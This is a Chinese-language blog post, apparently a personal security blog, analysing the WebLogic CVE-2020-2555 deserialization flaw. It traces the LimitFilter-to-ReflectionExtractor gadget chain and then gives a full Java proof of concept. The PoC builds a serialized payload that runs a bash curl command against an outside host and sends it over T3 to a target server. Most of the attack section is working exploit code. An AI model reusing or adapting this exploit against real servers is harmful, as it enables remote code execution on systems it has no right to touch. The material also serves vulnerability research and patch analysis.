<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Weblogic CVE-2020-2555 | ch1e的自留地</title>
<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="Weblogic CVE-2020-2555 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="CVE-2020-2555
漏洞分析
借用Zero Day的图，LimitFilter类的toString()方法移除了所有关于extractor.extract的调用

先来看看没打补丁前的toString方法
public String..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://ch0x01e.github.io">
  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
  </a>
  <h1 class="site-title">
    ch1e的自留地
  </h1>
  <p class="site-description">
    Manners maketh man
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
      
        <a href="https://ch1e.cn/post/friends" class="menu">
          友链
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              Weblogic CVE-2020-2555
            </h2>
            <div class="post-info">
              <span>
                2022-10-16
              </span>
              <span>
                4 min read
              </span>
              
            </div>
            
              <img class="post-feature-image" src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221015181502544.png" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="cve-2020-2555">CVE-2020-2555</h1>
<h2 id="漏洞分析">漏洞分析</h2>
<p>借用<a href="https://www.zerodayinitiative.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server">Zero Day</a>的图，LimitFilter<code>类的</code>toString()方法移除了所有关于extractor.extract的调用</p>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221015181502544.png" alt="image-20221015181502544" loading="lazy"></figure>
<p>先来看看没打补丁前的toString方法</p>
<pre><code class="language-java">public String toString() {
    StringBuilder sb = new StringBuilder(&quot;LimitFilter: (&quot;);
    sb.append(this.m_filter).append(&quot; [pageSize=&quot;).append(this.m_cPageSize).append(&quot;, pageNum=&quot;).append(this.m_nPage);
    if (this.m_comparator instanceof ValueExtractor) {
        ValueExtractor extractor = (ValueExtractor)this.m_comparator;
        sb.append(&quot;, top=&quot;).append(extractor.extract(this.m_oAnchorTop)).append(&quot;, bottom=&quot;).append(extractor.extract(this.m_oAnchorBottom));
    } else if (this.m_comparator != null) {
        sb.append(&quot;, comparator=&quot;).append(this.m_comparator);
    }

    sb.append(&quot;])&quot;);
    return sb.toString();
}
</code></pre>
<p>m_comparator如果是ValueExtractor子类，就可以调用m_comparator的extract方法，m_oAnchorTop和m_oAnchorBottom作为参数被传入，所以我们可以顺着这个思路，去找到实现了ValueExtractor接口并且实现<code>Serializable</code>或者<code>ExternalizableLite</code>反序列化接口并且有extract的类。这里找到的是<code>com.tangosol.util.extractor.ReflectionExtractor</code></p>
<pre><code class="language-java">public E extract(T oTarget) {
    if (oTarget == null) {
        return null;
    } else {
        Class clz = oTarget.getClass();

        try {
            Method method = this.m_methodPrev;
            if (method == null || method.getDeclaringClass() != clz) {
                this.m_methodPrev = method = ClassHelper.findMethod(clz, this.getMethodName(), ClassHelper.getClassArray(this.m_aoParam), false);
            }

            return method.invoke(oTarget, this.m_aoParam);
        } catch (NullPointerException var4) {
            throw new RuntimeException(this.suggestExtractFailureCause(clz));
        } catch (Exception var5) {
            throw ensureRuntimeException(var5, clz.getName() + this + '(' + oTarget + ')');
        }
    }
}
</code></pre>
<p>获取了传入的参数的Class对象，并且自身m_methodPrev属性作为Method对象，m_aoParam作为参数去调用。很像cc链中的<code>InvokerTransformer.transform()</code>，还需要找到一个类似ChainedTransformer的类，在这就是ChainedExtractor，然后配合cc5那个去打就行了</p>
<pre><code class="language-java">public E extract(Object oTarget) {
    ValueExtractor[] aExtractor = this.getExtractors();
    int i = 0;

    for(int c = aExtractor.length; i &lt; c &amp;&amp; oTarget != null; ++i) {
        oTarget = aExtractor[i].extract(oTarget);
    }

    return oTarget;
}
</code></pre>
<h2 id="poc">POC</h2>
<p>还是拿Y4er师傅的</p>
<pre><code class="language-java">package com.supeream;

// com.supeream from https://github.com/5up3rc/weblogic_cmd/
// com.tangosol.util.extractor.ChainedExtractor from coherence.jar

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

/*
 * author:Y4er.com
 *
 * gadget:
 *      BadAttributeValueExpException.readObject()
 *          com.tangosol.util.filter.LimitFilter.toString()
 *              com.tangosol.util.extractor.ChainedExtractor.extract()
 *                  com.tangosol.util.extractor.ReflectionExtractor.extract()
 *                      Method.invoke()
 *                      ...
 *                      Runtime.getRuntime.exec()
 */

public class CVE_2020_2555 {

    public static void main(String[] args) throws Exception {
        // Runtime.class.getRuntime()
        ReflectionExtractor extractor1 = new ReflectionExtractor(
                &quot;getMethod&quot;,
                new Object[]{&quot;getRuntime&quot;, new Class[0]}

        );

        // get invoke() to execute exec()
        ReflectionExtractor extractor2 = new ReflectionExtractor(
                &quot;invoke&quot;,
                new Object[]{null, new Object[0]}

        );

        // invoke(&quot;exec&quot;,&quot;calc&quot;)
        ReflectionExtractor extractor3 = new ReflectionExtractor(
                &quot;exec&quot;,
                new Object[]{new String[]{&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;curl http://172.16.1.1/success&quot;}}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField(&quot;m_comparator&quot;);
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(&quot;m_oAnchorTop&quot;);
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        // BadAttributeValueExpException toString()
        // This only works in JDK 8u76 and WITHOUT a security manager
        // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        // serialize
        byte[] payload = Serializables.serialize(badAttributeValueExpException);

        // T3 send, you can also use python script. weblogic_t3.py
        T3ProtocolOperation.send(&quot;172.16.1.130&quot;, &quot;7001&quot;, payload);

        // test
        serialize(badAttributeValueExpException);
//        deserialize();

    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(&quot;test.ser&quot;));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream(&quot;test.ser&quot;));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
</code></pre>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#cve-2020-2555">CVE-2020-2555</a>
<ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
<li><a href="#poc">POC</a></li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://ch0x01e.github.io/post/weblogc-cve-2020-14756/">
              <h3 class="post-title">
                Weblogc CVE-2020-14756
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
